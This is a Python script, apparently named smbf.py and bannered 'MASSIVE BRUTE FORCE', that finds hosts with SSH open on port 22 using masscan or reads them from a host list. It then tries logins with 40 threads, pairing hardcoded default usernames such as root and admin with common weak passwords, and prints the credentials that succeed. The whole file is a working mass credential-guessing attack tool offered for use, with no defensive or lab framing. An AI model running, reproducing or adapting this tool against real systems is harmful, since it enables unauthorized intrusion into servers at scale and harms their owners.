import subprocess
import paramiko
import concurrent.futures
import logging
import sys
import ipaddress

banner = """

 ___ ___ _  _ 
/ __/ __| || | MASSIVE
\__ \__ \ __ | BRUTE
|___/___/_||_| FORCE
WG
"""

print(banner)

def print_help_message():
    help_message = """
Usage:
  python3 smbf.py

Options:
  --help    Show this help message and exit.
  1         Use a predefined list of IPs and ports, one by line with format IP:PORT.
  2         Scan a range of IPs for open SSH on port 22 using masscan, with format 192.168.1.0/24.
"""
    print(help_message)

if "--help" in sys.argv:
    print_help_message()
    sys.exit(0)

print("Select mode:")
print("1) List")
print("2) Range")
print("---------------------")
choice = input("> ")
print("---------------------")

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def run_masscan(ip_range):
    output_file = "masscan_output.txt"
    try:
        print(f"Running masscan on the range {ip_range}...")
        subprocess.run(["masscan", ip_range, "-p22", "--rate", "500", "-oL", output_file], check=True)
        return output_file
    except subprocess.CalledProcessError as e:
        print(f"Error running masscan: {e}")
        return None

def parse_masscan_output(file_path):
    host_list = []
    with open(file_path, "r") as f:
        for line in f:
            if line.startswith("open tcp 22"):
                parts = line.split()
                if len(parts) >= 4:
                    ip = parts[3]
                    host_list.append((ip, "22"))
    return host_list

def is_valid_ip(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def attempt_ssh_connection(hostname, port, username, password, timeout=10):
    if hostname in skipped_ips:
        return

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(hostname, port=port, username=username, password=password, timeout=timeout)
        
        transport = client.get_transport()
        if transport:
            transport.allowed_key_types = set(["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519"])
        
        stdin, stdout, stderr = client.exec_command('echo "Connection Test"')
        response = stdout.read()
        if "Connection Test" in response.decode('utf-8'):
            print(f"{hostname}:{port} {username}:{password} +++ SUCCESS +++")
            successful_connections.append((hostname, port, username, password))
        else:
            print(f"{hostname}:{port} {username}:{password} Connection not completed")

    except paramiko.ssh_exception.NoValidConnectionsError as e:
        print(f"{hostname}:{port} {username}:{password} Unable to connect, skipping IP")
        skipped_ips.add(hostname)
    except paramiko.ssh_exception.AuthenticationException as e:
        print(f"{hostname}:{port} {username}:{password} Authentication failed")
    except Exception as e:
        print(f"{hostname}:{port} {username}:{password} Failed: {e}")
    finally:
        client.close()

if choice == '1':
    file_path = input('Enter the location of list: ')
    with open(file_path, "r") as f:
        host_list = [line.strip().split(':') for line in f if line.strip()]
elif choice == '2':
    ip_range = input('Enter the IP range to scan: ')
    file_path = run_masscan(ip_range)
    if file_path:
        host_list = parse_masscan_output(file_path)
    else:
        print("Masscan did not produce output or failed to run.")
        exit(1)
else:
    print("Invalid choice. Exiting.")
    exit(1)

successful_connections = []
skipped_ips = set()

users = ['root', 'admin', 'user', 'user1', 'test', 'ubuntu', 'adm', 'administrator', 'system', 'sys', 'toor', 'server', 'abc', 'account', 'administrador', 'localadmin', 'webadmin']
password_list = ['root', 'admin', 'user', 'test', 'ubuntu', 'default', 'password123', 'abc', 'abc123', 'server', 'password', 'guest', 'guest123', 'account', 'backup', 'localadmin', 'webadmin', '123', '1234', '12345', '123456', '12345678', '321', '54321', 'uploader', 'admin123', 'toor', 'P@ssw0rd']

max_concurrent_connections = 40

with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_connections) as executor:
    for user in users:
        for password in password_list:
            futures = []
            for host_entry in host_list:
                if len(host_entry) != 2:
                    print(f"Invalid host entry: {host_entry}")
                    continue
                hostname = host_entry[0]
                port = host_entry[1]
                future = executor.submit(attempt_ssh_connection, hostname, port, user, password)
                futures.append(future)
            concurrent.futures.wait(futures)

if successful_connections:
    print("\nSuccessful Connections:")
    for conn in successful_connections:
        print(f"Hostname: {conn[0]}, Port: {conn[1]}, Username: {conn[2]}, Password: {conn[3]}")
